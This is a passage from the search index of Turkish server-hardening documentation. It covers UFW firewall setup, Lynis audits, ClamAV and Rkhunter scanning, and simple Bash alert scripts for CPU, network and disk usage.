\u015feyi ENGELLE\nsudo ufw default deny incoming\n\n# D\u0131\u015far\u0131ya giden her \u015feyi ENGELLE (Opsiyonel ama \u00f6nerilir - Egress Filtering)\n# Bu, sunucu hacklenirse sald\u0131rgan\u0131n d\u0131\u015far\u0131ya veri ka\u00e7\u0131rmas\u0131n\u0131 zorla\u015ft\u0131r\u0131r.\nsudo ufw default deny outgoing\n</code></pre>"},{"location":"security/firewall/#3-temel-hizmetlerin-izni","title":"3. Temel Hizmetlerin \u0130zni","text":"<p>Her \u015feyi yasaklad\u0131k, \u015fimdi sadece \u00e7al\u0131\u015fan servislerimize \"delik a\u00e7aca\u011f\u0131z\".</p>"},{"location":"security/firewall/#admin-erisimi-ssh-cok-onemli","title":"Admin Eri\u015fimi (SSH) - \u00c7OK \u00d6NEML\u0130 \u26a0\ufe0f","text":"<p>Bunu yapmazsan\u0131z sunucudan d\u0131\u015far\u0131da kal\u0131rs\u0131n\u0131z!</p> <pre><code># E\u011fer standart port (22) kullan\u0131yorsan\u0131z:\nsudo ufw limit 22/tcp comment 'SSH'\n\n# E\u011fer \u00f6zel port (\u00f6rn: 2222) kullan\u0131yorsan\u0131z:\nsudo ufw limit 2222/tcp comment 'SSH Port'\n</code></pre>"},{"location":"security/firewall/#sk-kullanlan-servisler-ve-portlar","title":"S\u0131k Kullan\u0131lan Servisler ve Portlar\u0131","text":"Servis Ad\u0131 Port/Protokol A\u00e7\u0131klama SSH 22/tcp G\u00fcvenli Kabuk Eri\u015fimi HTTP 80/tcp Web Sunucusu (\u015eifresiz) HTTPS 443/tcp Web Sunucusu (\u015eifreli) DNS 53/udp, 53/tcp Alan Ad\u0131 \u00c7\u00f6z\u00fcmlemesi NTP 123/udp A\u011f Zaman Protokol\u00fc MySQL 3306/tcp Veritaban\u0131 Sunucusu PostgreSQL 5432/tcp Veritaban\u0131 Sunucusu Redis 6379/tcp Bellek \u0130\u00e7i Veri Deposu <p>[!NOTE] &gt; <code>limit</code> Nas\u0131l \u00c7al\u0131\u015f\u0131r?</p> <ul> <li>30 saniye i\u00e7inde 6'dan fazla ba\u011flant\u0131 denemesi yapan IP ge\u00e7ici olarak engellenir.</li> <li>Brute-force sald\u0131r\u0131lar\u0131na kar\u015f\u0131 basit ama etkili bir korumad\u0131r.</li> <li>Daha geli\u015fmi\u015f koruma i\u00e7in Fail2Ban kullan\u0131lmal\u0131d\u0131r.</li> </ul>"},{"location":"security/firewall/#web-sunucusu-httphttps","title":"Web Sunucusu (HTTP/HTTPS)","text":"<pre><code>sudo ufw allow 80/tcp comment 'HTTP'\nsudo ufw allow 443/tcp comment 'HTTPS'\n</code></pre>"},{"location":"security/firewall/#sunucunun-dsar-ckmas-icin-outgoing","title":"Sunucunun D\u0131\u015far\u0131 \u00c7\u0131kmas\u0131 \u0130\u00e7in (Outgoing)","text":"<p>E\u011fer \"Gideni Yasakla\" (<code>default deny outgoing</code>) yapt\u0131ysan\u0131z, sunucunun \u00e7al\u0131\u015fmas\u0131 i\u00e7in \u015funlara izin vermelisiniz:</p> <pre><code># 1. DNS (Alan adlar\u0131n\u0131 \u00e7\u00f6zmek i\u00e7in)\nsudo ufw allow out 53 comment 'DNS'\n\n# 2. HTTP/HTTPS (Dosya indirmek, update yapmak, webhook atmak i\u00e7in)\nsudo ufw allow out 80/tcp comment 'HTTP Out'\nsudo ufw allow out 443/tcp comment 'HTTPS Out'\n\n# 3. NTP (Saat senkronizasyonu)\nsudo ufw allow out 123/udp comment 'NTP'\n</code></pre>"},{"location":"security/firewall/#4-aktiflestirme","title":"4. Aktifle\u015ftirme","text":"<p>Kurallar\u0131 girdik ama hen\u00fcz aktif de\u011fil. \u00d6nce ekledi\u011fimiz kurallar\u0131 kontrol edelim:</p> <pre><code># Hen\u00fcz aktif olmad\u0131\u011f\u0131 i\u00e7in 'status' \u00e7al\u0131\u015fmaz. Eklenenleri \u015f\u00f6yle g\u00f6r\u00fcr\u00fcz:\nsudo ufw show added\n</code></pre> <p>Her \u015fey do\u011fruysa, art\u0131k sistemi ba\u015flatabiliriz.</p> <pre><code># SADECE KOMUTU \u00c7ALI\u015eTIRIN AMA 'y' DEMEDEN \u00d6NCE OKUYUN:\n# \"Command may disrupt existing ssh connections\" uyar\u0131s\u0131 verecektir.\n# E\u011fer yukar\u0131daki SSH kural\u0131n\u0131 eklediyseniz korkmay\u0131n, 'y' diyip devam edin.\nsudo ufw enable\n</code></pre> <p>[!TIP] &gt; Kal\u0131c\u0131l\u0131k: &gt; <code>enable</code> komutu, servisi hem hemen \u00e7al\u0131\u015ft\u0131r\u0131r hem de sunucu yeniden ba\u015flad\u0131\u011f\u0131nda otomatik a\u00e7\u0131lmas\u0131 i\u00e7in ayarlar. Yani sunucuya reboot atsan\u0131z bile kurallar\u0131n tekrar aktif olmas\u0131 i\u00e7in bir \u015fey yapman\u0131za gerek yoktur.</p> <p>Durumu Kontrol Et:</p> <pre><code>sudo ufw status verbose\n</code></pre>"},{"location":"security/firewall/#5-yonetim-ve-ipuclar","title":"5. Y\u00f6netim ve \u0130pu\u00e7lar\u0131","text":""},{"location":"security/firewall/#kural-silme","title":"Kural Silme","text":"<p>En kolay yol numaral\u0131 listeyi kullanmakt\u0131r.</p> <pre><code># 1. Numaralar\u0131 g\u00f6r\nsudo ufw status numbered\n\n# 2. Numaraya g\u00f6re sil (\u00d6rn: 5 numaral\u0131 kural\u0131 sil)\nsudo ufw delete 5\n</code></pre>"},{"location":"security/firewall/#loglama","title":"Loglama","text":"<p>Kimler ne deniyor g\u00f6rmek i\u00e7in loglar\u0131 a\u00e7abilirsiniz (Diski doldurmamas\u0131 i\u00e7in 'low' seviyesinde).</p> <pre><code>sudo ufw logging on\nsudo ufw logging low\n</code></pre> <p>Loglar <code>/var/log/ufw.log</code> dosyas\u0131na yaz\u0131l\u0131r.</p>"},{"location":"security/firewall/#belirli-bir-ipye-izin-verme","title":"Belirli Bir IP'ye \u0130zin Verme","text":"<p>Y\u00f6netim panelinizi t\u00fcm d\u00fcnyaya a\u00e7mak yerine sadece ofis IP'nize a\u00e7\u0131n:</p> <pre><code>sudo ufw allow from 195.175.X.Y to any port 2222 proto tcp comment 'Ofis SSH'\n</code></pre>"},{"location":"security/firewall/#6-docker-kullananlar-icin-kritik-uyar","title":"6. Docker Kullananlar \u0130\u00e7in Kritik Uyar\u0131 \ud83d\udc33","text":"<p>[!WARNING] &gt; Docker G\u00fcvenlik A\u00e7\u0131\u011f\u0131: Docker, varsay\u0131lan olarak <code>iptables</code> kurallar\u0131n\u0131 kendisi y\u00f6netir ve UFW'yi BYPASS EDER. Yani siz UFW'den 8080 portunu kapatsan\u0131z bile, Docker o portu a\u00e7t\u0131ysa d\u0131\u015far\u0131dan eri\u015filebilir!</p>"},{"location":"security/firewall/#cozum-ufw-docker-arac","title":"\u00c7\u00f6z\u00fcm: <code>ufw-docker</code> Arac\u0131","text":"<p>Manuel <code>iptables</code> ayar\u0131 yapmak zordur. Bunun yerine \u015fu arac\u0131 kullan\u0131n:</p> <p>1. Arac\u0131 Kurun:</p> <pre><code>sudo wget -O /usr/local/bin/ufw-docker https://github.com/chaifeng/ufw-docker/raw/master/ufw-docker\nsudo chmod +x /usr/local/bin/ufw-docker\n</code></pre> <p>2. Docker Entegrasyonunu Yap\u0131n:</p> <pre><code># Bu komut gerekli iptables kurallar\u0131n\u0131 ekler\nufw-docker install\n</code></pre> <p>3. Docker Portlar\u0131n\u0131 A\u00e7ma (Art\u0131k UFW \u00dczerinden): Bir container'a d\u0131\u015far\u0131dan eri\u015fim vermek isterseniz art\u0131k:</p> <pre><code># Sadece belirli bir container'a izin ver\nufw-docker allow my-web-container 80\n</code></pre> <p>\u015eeklinde kullanmal\u0131s\u0131n\u0131z. Detaylar i\u00e7in ufw-docker GitHub sayfas\u0131na bak\u0131n.</p>"},{"location":"security/firewall/#7-acil-durum-senaryolar","title":"7. Acil Durum Senaryolar\u0131 \ud83d\udea8","text":""},{"location":"security/firewall/#sunucuya-erisimi-kaybettim","title":"Sunucuya Eri\u015fimi Kaybettim!","text":"<ol> <li>Hetzner/AWS Konsol: Hosting panelinizden VNC/Console ile ba\u011flan\u0131n.</li> <li>Firewall'u Kapat\u0131n: <pre><code>sudo ufw disable\n</code></pre></li> <li>Hala Girilemiyor mu? Sunucuyu \"Rescue Mode\"a al\u0131n.</li> </ol>"},{"location":"security/firewall/#tum-kurallar-anlk-kaldrmak-panik-butonu","title":"T\u00fcm Kurallar\u0131 Anl\u0131k Kald\u0131rmak (Panik Butonu)","text":"<pre><code>sudo ufw reset &amp;&amp; sudo ufw disable\n</code></pre>"},{"location":"security/firewall/#belirli-bir-ipyi-acil-banlamak","title":"Belirli Bir IP'yi Acil Banlamak","text":"<pre><code>sudo ufw deny from 185.143.223.0/24 comment 'Spam IP Blo\u011fu'\n</code></pre>"},{"location":"security/firewall/#8-kurulum-kontrol-listesi","title":"8. Kurulum Kontrol Listesi \u2705","text":"<ul> <li>[ ] UFW kuruldu (<code>sudo apt install ufw</code>)</li> <li>[ ] Varsay\u0131lan politikalar ayarland\u0131 (<code>default deny incoming</code>)</li> <li>[ ] SSH portu a\u00e7\u0131ld\u0131 (Yoksa d\u0131\u015far\u0131da kal\u0131rs\u0131n!)</li> <li>[ ] Web portlar\u0131 a\u00e7\u0131ld\u0131 (80, 443)</li> <li>[ ] Outgoing kurallar\u0131 eklendi (DNS, HTTP, NTP)</li> <li>[ ] Kontrol edildi: <code>sudo ufw show added</code></li> <li>[ ] Aktif edildi: <code>sudo ufw enable</code></li> <li>[ ] Docker kullan\u0131l\u0131yorsa <code>ufw-docker</code> kuruldu</li> </ul>"},{"location":"security/lynis/","title":"Lynis (G\u00fcvenlik Denetimi)","text":"<p>Lynis, sunucuda h\u0131zl\u0131 bir g\u00fcvenlik denetimi yap\u0131p, sisteminizi 100 \u00fczerinden puanlayan ve eksikleri raporlayan bir ara\u00e7t\u0131r. Bir \"Antivir\u00fcs\" de\u011fildir; bir \"M\u00fcfetti\u015f\"tir.</p>"},{"location":"security/lynis/#1-kurulum","title":"1. Kurulum","text":"<pre><code>sudo apt update\nsudo apt install -y lynis\n</code></pre>"},{"location":"security/lynis/#2-tarama-baslatma","title":"2. Tarama Ba\u015flatma","text":"<p>Taramay\u0131 ba\u015flat\u0131n:</p> <pre><code>sudo lynis audit system\n</code></pre> <p>(Enter'a basarak ilerleyebilirsiniz. H\u0131zl\u0131 ge\u00e7mek i\u00e7in <code>-Q</code> parametresini kullanabilirsiniz: <code>sudo lynis audit system -Q</code>)</p>"},{"location":"security/lynis/#3-yaygn-uyarlar-ve-cozumleri","title":"3. Yayg\u0131n Uyar\u0131lar ve \u00c7\u00f6z\u00fcmleri","text":"<p>Tarama sonucunda muhtemelen \u015funlar\u0131 g\u00f6receksiniz:</p>"},{"location":"security/lynis/#malware-scanner-not-found","title":"\u26a0\ufe0f Malware scanner not found","text":"<p>Anlam\u0131: Lynis, sistemde vir\u00fcs veya rootkit taray\u0131c\u0131s\u0131 (ClamAV, Rkhunter) bulamad\u0131. \u00c7\u00f6z\u00fcm: Bu bir \"hata\" de\u011fil, eksikliktir. Linux sunucularda antivir\u00fcs \u015fart de\u011fildir ama \"Rootkit Hunter\" kurmak iyi bir pratiktir. \u00c7\u00f6z\u00fcm: Bu bir \"hata\" de\u011fil, eksikliktir. Linux sunucularda antivir\u00fcs \u015fart de\u011fildir ama \"Rootkit Hunter\" kurmak iyi bir pratiktir. Kurulum (Opsiyonel):</p> <p>Detayl\u0131 kurulum ve yap\u0131land\u0131rma i\u00e7in Malware &amp; Rootkit Taramas\u0131 sayfas\u0131n\u0131 inceleyin.</p>"},{"location":"security/lynis/#security-repository-not-found-pkgs-7388","title":"\u26a0\ufe0f Security repository not found (PKGS-7388)","text":"<p>Anlam\u0131: Lynis, Ubuntu 24.04'\u00fcn yeni kaynak format\u0131n\u0131 (<code>.sources</code>) bazen tan\u0131yamaz ve g\u00fcvenlik deposu yok san\u0131r. \u00c7\u00f6z\u00fcm: Bu bir False Positive (Yanl\u0131\u015f Alarm) durumudur. E\u011fer <code>apt-cache policy</code> \u00e7\u0131kt\u0131s\u0131nda <code>-security</code> g\u00f6r\u00fcyorsan\u0131z bu uyar\u0131y\u0131 g\u00f6rmezden gelebilirsiniz.</p>"},{"location":"security/lynis/#4-sk-kullanlan-parametreler","title":"4. S\u0131k Kullan\u0131lan Parametreler \ud83d\udee0\ufe0f","text":"<p>Lynis'i daha efektif kullanmak i\u00e7in \u015fu parametreleri bilmenizde fayda var:</p> Parametre Ne \u0130\u015f Yapar? \u00d6rnek <code>-Q</code> (Quick) Hi\u00e7bir tu\u015fa basman\u0131z\u0131 beklemez, otomatik tarar. <code>lynis audit system -Q</code> <code>--pentest</code> Root olmayan (non-privileged) bir tarama yapar. <code>lynis audit system --pentest</code> <code>--verbose</code> Ekrana daha detayl\u0131 \u00e7\u0131kt\u0131 (k\u0131rm\u0131z\u0131/ye\u015fil) basar. <code>lynis audit system --verbose</code> <code>--log-file</code> Raporu \u00f6zel bir dosyaya kaydeder. <code>lynis audit system --log-file=/tmp/lynis.log</code>"},{"location":"security/lynis/#old-version-update-available","title":"\u26a0\ufe0f Old version / Update available","text":"<p>Anlam\u0131: Lynis'in kendi s\u00fcr\u00fcm\u00fc eski olabilir. Ubuntu depolar\u0131ndaki (<code>apt install lynis</code>) s\u00fcr\u00fcm, resmi siteden birka\u00e7 ay/y\u0131l geriden gelebilir. \u00c7\u00f6z\u00fcm: Bu bir g\u00fcvenlik a\u00e7\u0131\u011f\u0131 de\u011fildir, sadece yeni \u00f6zelliklerin eksik oldu\u011funu g\u00f6sterir.</p> <p>Nas\u0131l G\u00fcncellenir? (Opsiyonel) E\u011fer bu uyar\u0131y\u0131 kald\u0131rmak ve en son s\u00fcr\u00fcm\u00fc kullanmak isterseniz, resmi deposunu ekleyebilirsiniz:</p> <pre><code># 1. Eski s\u00fcr\u00fcm\u00fc sil\nsudo apt remove lynis -y\n\n# 2. Resmi CISOfy deposunu ekle\nwget -O - https://packages.cisofy.com/keys/cisofy-software-public.key | sudo apt-key add -\necho \"deb https://packages.cisofy.com/community/lynis/deb/ stable main\" | sudo tee /etc/apt/sources.list.d/cisofy-lynis.list\n\n# 3. G\u00fcncel s\u00fcr\u00fcm\u00fc kur\nsudo apt update\nsudo apt install lynis\n</code></pre>"},{"location":"security/lynis/#firewall-not-active","title":"\u26a0\ufe0f Firewall not active","text":"<p>Anlam\u0131: UFW veya Iptables aktif de\u011fil. \u00c7\u00f6z\u00fcm: Firewall b\u00f6l\u00fcm\u00fcndeki ayarlar\u0131 yap\u0131n. (Docker kullan\u0131yorsan\u0131z bu uyar\u0131 bazen yan\u0131lt\u0131c\u0131 olabilir, <code>nft list ruleset</code> ile kontrol edin).</p>"},{"location":"security/lynis/#banner-issue-file","title":"\u26a0\ufe0f Banner / Issue file","text":"<p>Anlam\u0131: SSH ile ba\u011flan\u0131rken ekranda \"Ubuntu 22.04\" gibi versiyon bilgisi yaz\u0131yor. Sald\u0131rganlara bilgi vermemek i\u00e7in bunu gizlemenizi \u00f6nerir. \u00c7\u00f6z\u00fcm: <code>/etc/issue.net</code> dosyas\u0131n\u0131n i\u00e7eri\u011fini temizleyebilirsiniz.</p>"},{"location":"security/lynis/#4-raporu-okuma","title":"4. Raporu Okuma","text":"<p>Tarama bitince size bir Hardening Index (\u00d6rn: 65/100) verir.</p> <ul> <li>60 alt\u0131: G\u00fcvenlik zay\u0131f, acil \u00f6nlem laz\u0131m.</li> <li>70-80 aras\u0131: Gayet iyi, standart bir sunucu i\u00e7in yeterli.</li> <li>90 \u00fcst\u00fc: \u00c7ok s\u0131k\u0131 (Hardened), bazen kullan\u0131m\u0131 zorla\u015ft\u0131rabilir.</li> </ul> <p>Detayl\u0131 rapor <code>/var/log/lynis.log</code> dosyas\u0131ndad\u0131r.</p>"},{"location":"security/lynis/#5-otomatik-tarama-cron","title":"5. Otomatik Tarama (Cron)","text":"<p>Ayda bir sistemin sa\u011fl\u0131k durumunu kontrol etmek i\u00e7in:</p> <pre><code>echo \"0 3 1 * * root /usr/bin/lynis audit system -Q\" | sudo tee /etc/cron.d/lynis-audit\n</code></pre>"},{"location":"security/malware/","title":"Malware ve Rootkit Taramas\u0131 (ClamAV &amp; Rkhunter)","text":"<p>Linux g\u00fcvenli\u011finde \"Antivir\u00fcs gereksizdir\" efsanesi, modern tehditler kar\u015f\u0131s\u0131nda ge\u00e7erlili\u011fini yitirmi\u015ftir. Sunucunuzda Windows vir\u00fcsleri \u00e7al\u0131\u015fmasa bile, zararl\u0131 yaz\u0131l\u0131mlar\u0131 bar\u0131nd\u0131r\u0131p a\u011fdaki di\u011fer cihazlara yayabilir veya Rootkit denen sinsi ara\u00e7larla ele ge\u00e7irilebilir.</p> <p>Lynis, malware taray\u0131c\u0131s\u0131 bulamazsa g\u00fcvenlik puan\u0131n\u0131z\u0131 d\u00fc\u015f\u00fcr\u00fcr. Bu rehberde en iyi ikili kombinasyonu kuraca\u011f\u0131z: ClamAV + Rkhunter.</p>"},{"location":"security/malware/#1-hangi-arac-neden-sectik","title":"1. Hangi Arac\u0131 Neden Se\u00e7tik?","text":"<p>Tek bir ara\u00e7 yetmez, \u00e7\u00fcnk\u00fc odak noktalar\u0131 farkl\u0131d\u0131r:</p> Ara\u00e7 Odak Ne Yapar? Kaynak T\u00fcketimi ClamAV Vir\u00fcs &amp; Malware Dosya sistemindeki bilinen zararl\u0131lar\u0131 (trojan, mine scriptleri, Windows vir\u00fcsleri) tarar. Orta (Tarama s\u0131ras\u0131nda) Rkhunter Rootkit Sistem dosyalar\u0131n\u0131n de\u011fi\u015ftirilip de\u011fi\u015ftirilmedi\u011fini (checksum) ve backdoor (arka kap\u0131) belirtilerini kontrol eder. \u00c7ok D\u00fc\u015f\u00fck <p>\u00d6neri: \u0130kisini birlikte kullan\u0131n. Birbirlerini tamamlarlar.</p>"},{"location":"security/malware/#2-clamav-kurulumu-antivirus","title":"2. ClamAV Kurulumu (Antivir\u00fcs)","text":"<p>En pop\u00fcler a\u00e7\u0131k kaynakl\u0131 antivir\u00fcs motorudur.</p>"},{"location":"security/malware/#kurulum","title":"Kurulum","text":"<pre><code>sudo apt update\nsudo apt install clamav clamav-daemon -y\n</code></pre>"},{"location":"security/malware/#veritaban-guncelleme","title":"Veritaban\u0131 G\u00fcncelleme","text":"<p>Kurulumdan sonra vir\u00fcs veritaban\u0131n\u0131 g\u00fcncelleyin. E\u011fer <code>freshclam</code> servisi \u00e7al\u0131\u015f\u0131yorsa \u00f6nce durdurun:</p> <pre><code>sudo systemctl stop clamav-freshclam\nsudo freshclam\nsudo systemctl start clamav-freshclam\n</code></pre>"},{"location":"security/malware/#manuel-tarama","title":"Manuel Tarama","text":"<p>T\u00fcm sistemi taramak uzun s\u00fcrer ve CPU kullan\u0131r. \u00d6nce kritik dizinleri taray\u0131n:</p> <pre><code># Sadece Home dizinini tara, enfekte dosyalar\u0131 g\u00f6ster (-i), \u00f6terek uyar (--bell)\nsudo clamscan -r -i --bell /home\n\n# T\u00fcm sistemi tara (Uzun s\u00fcrer!)\n# sudo clamscan -r -i / --exclude-dir=\"^/sys\" --exclude-dir=\"^/proc\" --exclude-dir=\"^/dev\"\n</code></pre>"},{"location":"security/malware/#3-rkhunter-kurulumu-rootkit-avcs","title":"3. Rkhunter Kurulumu (Rootkit Avc\u0131s\u0131)","text":"<p>Rootkit'ler, kendilerini gizleyen ve sistemin \u00e7ekirde\u011fine s\u0131zan zararl\u0131lard\u0131r. Rkhunter, sistem dosyalar\u0131n\u0131n (<code>ls</code>, <code>ps</code>, <code>top</code> gibi) de\u011fi\u015ftirilip de\u011fi\u015ftirilmedi\u011fini kontrol eder.</p>"},{"location":"security/malware/#kurulum_1","title":"Kurulum","text":"<pre><code>sudo apt install rkhunter -y\n</code></pre>"},{"location":"security/malware/#ilk-ayar-onemli","title":"\u0130lk Ayar (\u00d6nemli!)","text":"<p>Rkhunter kurulduktan sonra sisteme \"\u015eu anki halim temizdir, bunun foto\u011fraf\u0131n\u0131 \u00e7ek\" demelisiniz. Buna Snapshot denir.</p> <pre><code># Mevcut dosya \u00f6zelliklerini veritaban\u0131na kaydet\nsudo rkhunter --propupd\n</code></pre>"},{"location":"security/malware/#tarama-yapma","title":"Tarama Yapma","text":"<pre><code># Taramay\u0131 ba\u015flat (Enter'a basmadan ge\u00e7mek i\u00e7in --sk)\nsudo rkhunter --check --sk\n</code></pre> <p>Loglar\u0131 incelemek i\u00e7in:</p> <pre><code>sudo cat /var/log/rkhunter.log | grep -i warning\n</code></pre> <p>Not: Rkhunter bazen \"Hidden file found\" gibi yanl\u0131\u015f alarmlar (False Positive) verebilir. \u00d6rne\u011fin <code>/usr/bin/wp</code> (WordPress CLI) gibi scriptleri \u015f\u00fcpheli bulabilir. Loglardan kontrol edip g\u00fcvenliyse <code>rkhunter.conf</code> dosyas\u0131na ekleyebilirsiniz.</p>"},{"location":"security/malware/#4-otomasyon-gece-taramas","title":"4. Otomasyon (Gece Taramas\u0131)","text":"<p>Her g\u00fcn manuel tarama yapmak zordur. Bunu otomatize edelim.</p>"},{"location":"security/malware/#gunluk-cron-job-olusturma","title":"G\u00fcnl\u00fck Cron Job Olu\u015fturma","text":"<p>Haftan\u0131n her g\u00fcn\u00fc gece 03:00'te \u00e7al\u0131\u015facak bir script ayarlayal\u0131m.</p> <ol> <li> <p>Cron dosyas\u0131n\u0131 a\u00e7\u0131n:</p> <pre><code>sudo crontab -e\n</code></pre> </li> <li> <p>En alta \u015fu sat\u0131r\u0131 ekleyin:</p> <pre><code># Her gece 03:00'te ClamAV taramas\u0131 (Sadece /home ve /var/www)\n0 3 * * * /usr/bin/clamscan -r -i /home /var/www &gt; /var/log/clamav-daily.log 2&gt;&amp;1\n\n# Her gece 03:30'da Rkhunter taramas\u0131 (Sadece g\u00fcncelleme ve kontrol)\n30 3 * * * /usr/bin/rkhunter --update --propupd --check --sk &gt; /var/log/rkhunter-daily.log 2&gt;&amp;1\n</code></pre> </li> </ol> <p>bu sayede sabah kalkt\u0131\u011f\u0131n\u0131zda loglar\u0131 kontrol edebilirsiniz.</p>"},{"location":"security/malware/#5-ozet","title":"5. \u00d6zet","text":"<p>Bu iki arac\u0131 kurarak:</p> <ol> <li>Lynis Puan\u0131n\u0131z\u0131 Artt\u0131rd\u0131n\u0131z: Lynis art\u0131k \"Malware scanner found\" diyecek.</li> <li>Dosya G\u00fcvenli\u011fi: Sunucunuza y\u00fcklenen zararl\u0131 dosyalar\u0131 (ClamAV) fark edeceksiniz.</li> <li>Sistem B\u00fct\u00fcnl\u00fc\u011f\u00fc: E\u011fer bir hacker <code>ls</code> komutunu de\u011fi\u015ftirip kendi dosyalar\u0131n\u0131 gizlerse (Rootkit), Rkhunter bunu yakalayacak.</li> </ol>"},{"location":"security/malware/#6-kurulumu-nasl-test-ederim","title":"6. Kurulumu Nas\u0131l Test Ederim?","text":"<p>Her \u015feyi kurduk ama \u00e7al\u0131\u015f\u0131yor mu? Hemen test edelim.</p>"},{"location":"security/malware/#clamav-testi-eicar-dosyas","title":"ClamAV Testi (EICAR Dosyas\u0131)","text":"<p>Antivir\u00fcs sistemlerini test etmek i\u00e7in kullan\u0131lan zarars\u0131z bir test dosyas\u0131 vard\u0131r (EICAR).</p> <ol> <li> <p>Test dosyas\u0131n\u0131 indirin:</p> <pre><code>wget https://secure.eicar.org/eicar.com.txt\n</code></pre> </li> <li> <p>Taramay\u0131 \u00e7al\u0131\u015ft\u0131r\u0131n:</p> <pre><code>clamscan eicar.com.txt\n</code></pre> </li> <li> <p>Sonu\u00e7: \u00c7\u0131kt\u0131da <code>eicar.com.txt: Win.Test.EICAR_HDB-1 FOUND</code> yaz\u0131s\u0131n\u0131 g\u00f6r\u00fcyorsan\u0131z ClamAV \u00e7al\u0131\u015f\u0131yor demektir! (Test dosyas\u0131n\u0131 silebilirsiniz).</p> </li> </ol>"},{"location":"security/malware/#rkhunter-testi","title":"Rkhunter Testi","text":"<p>Rkhunter'\u0131n versiyonunu ve veritaban\u0131 durumunu kontrol edin.</p> <pre><code>sudo rkhunter --versioncheck\n</code></pre> <p>E\u011fer hata vermiyorsa ve versiyon numaras\u0131n\u0131 g\u00f6r\u00fcyorsan\u0131z kurulum ba\u015far\u0131l\u0131d\u0131r.</p>"},{"location":"security/monitoring/","title":"\u0130zleme ve Anomali Tespiti (Monitoring) \ud83d\udcca","text":"<p>Sunucunuzda Prometheus veya Grafana gibi geli\u015fmi\u015f ara\u00e7lar yoksa, basit Bash scriptleri ile CPU kullan\u0131m\u0131 veya A\u011f trafi\u011fi anormalle\u015fti\u011finde mail atman\u0131z\u0131 sa\u011flayabilirsiniz.</p> <p>\u00d6zellikle \"Gece 3'te CPU neden %100 oldu?\" sorusunun cevab\u0131n\u0131 yakalamak i\u00e7in hayati \u00f6nem ta\u015f\u0131r.</p> <p>\u26a0\ufe0f \u0130lk Kurulumda Test Edin! Script'leri cron'a eklemeden \u00f6nce manuel \u00e7al\u0131\u015ft\u0131r\u0131p mail/bildirim geldi\u011fini do\u011frulay\u0131n: <code>sudo /usr/local/bin/cpu_alert.sh</code></p>"},{"location":"security/monitoring/#1-on-gereksinim-mail-kurulumu","title":"1. \u00d6n Gereksinim: Mail Kurulumu \ud83d\udcec","text":"<p>Scriptlerin \u00e7al\u0131\u015fmas\u0131 i\u00e7in sunucunun mail atabilmesi gerekir.</p> <pre><code># Basit mail client kurulumu\nsudo apt install mailutils -y\n\n# Test et\necho \"Test mail\" | mail -s \"Test\" admin@example.com\n</code></pre> <p>Not: E\u011fer sunucu mail atam\u0131yorsa (Port 25 kapal\u0131ysa), a\u015fa\u011f\u0131da anlat\u0131lan Telegram y\u00f6ntemini kullan\u0131n.</p>"},{"location":"security/monitoring/#2-cpu-anomali-alarm","title":"2. CPU Anomali Alarm\u0131 \ud83d\udea8","text":"<p>Bu script, CPU kullan\u0131m\u0131 belirledi\u011finiz e\u015fi\u011fi (\u00f6rn: %80) ge\u00e7erse size mail atar ve log tutar.</p> <p>Dosya: <code>/usr/local/bin/cpu_alert.sh</code></p> <pre><code>#!/bin/bash\n# cpu_alert.sh - CPU Spike Monitor\n\nTHRESHOLD=80\nCPU_USAGE=$(top -bn1 | grep \"Cpu(s)\" | awk '{print int($2)}')\nLOG_FILE=\"/var/log/cpu_alerts.log\"\nEMAIL=\"admin@example.com\"\n\nif [ \"$CPU_USAGE\" -gt \"$THRESHOLD\" ]; then\n    TOP_PROCESS=$(ps aux --sort=-%cpu | head -6)\n    MESSAGE=\"\u26a0\ufe0f CPU ALERT: Sunucu kullan\u0131m\u0131 %$CPU_USAGE seviyesinde!\\n\\nDetaylar:\\n$TOP_PROCESS\"\n    echo -e \"$MESSAGE\" | mail -s \"CPU Alert - $(hostname)\" \"$EMAIL\"\n    echo \"$(date): CPU $CPU_USAGE%\" &gt;&gt; \"$LOG_FILE\"\nfi\n</code></pre> <p>Kurulum:</p> <pre><code>sudo chmod +x /usr/local/bin/cpu_alert.sh\necho \"*/5 * * * * root /usr/local/bin/cpu_alert.sh\" | sudo tee /etc/cron.d/cpu-alert\n</code></pre>"},{"location":"security/monitoring/#3-network-anomali-alarm-ddos-tespiti","title":"3. Network Anomali Alarm\u0131 (DDoS Tespiti) \ud83c\udf10","text":"<p><code>netstat</code> yerine modern ve h\u0131zl\u0131 <code>ss</code> komutunu kullan\u0131yoruz.</p> <p>Dosya: <code>/usr/local/bin/network_alert.sh</code></p> <pre><code>#!/bin/bash\n# network_alert.sh - Outbound Connection Monitor\n\n# E\u015fik de\u011fer: 100 ba\u011flant\u0131dan fazlas\u0131 \u015f\u00fcpheli\nTHRESHOLD=100\nLOG_FILE=\"/var/log/network_alerts.log\"\nEMAIL=\"admin@example.com\"\n\n# Loopback hari\u00e7 aktif ba\u011flant\u0131lar\u0131 say (H\u0131zl\u0131 y\u00f6ntem)\nCONNECTIONS=$(ss -tunap | grep ESTAB | grep -v '127.0.0.1' | wc -l)\n\nif [ \"$CONNECTIONS\" -gt \"$THRESHOLD\" ]; then\n    # Ba\u011flant\u0131 detaylar\u0131n\u0131 al\n    DETAILS=$(ss -tunap | grep ESTAB | awk '{print $6}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -10)\n\n    echo \"\u26a0\ufe0f NETWORK ALERT: $CONNECTIONS adet aktif ba\u011flant\u0131 tespit edildi!\" | \\\n    mail -s \"Network Anomaly - $(hostname)\" \"$EMAIL\"\n\n    echo \"$(date): $CONNECTIONS connections\" &gt;&gt; \"$LOG_FILE\"\n    echo \"$DETAILS\" &gt;&gt; \"$LOG_FILE\"\nfi\n</code></pre> <p>Kurulum:</p> <pre><code>sudo chmod +x /usr/local/bin/network_alert.sh\necho \"*/5 * * * * root /usr/local/bin/network_alert.sh\" | sudo tee /etc/cron.d/network-alert\n</code></pre>"},{"location":"security/monitoring/#4-disk-ve-memory-alarmlar","title":"4. Disk ve Memory Alarmlar\u0131 \ud83d\udcbe\ud83e\udde0","text":"<p>Disk dolarsa sunucu durur, RAM dolarsa <code>OOM Killer</code> servisleri \u00f6ld\u00fcr\u00fcr.</p> <p>Dosya: <code>/usr/local/bin/disk_alert.sh</code></p> <pre><code>#!/bin/bash\nTHRESHOLD=85\nUSAGE=$(df / | tail -1 | awk '{print int($5)}')\nif [ \"$USAGE\" -gt \"$THRESHOLD\" ]; then\n    df -h | mail -s \"\u26a0\ufe0f Disk Alert: %$USAGE dolu - $(hostname)\" admin@example.com\nfi\n</code></pre> <p>Dosya: <code>/usr/local/bin/memory_alert.sh</code></p> <pre><code>#!/bin/bash\nTHRESHOLD=90\nUSAGE=$(free | grep Mem 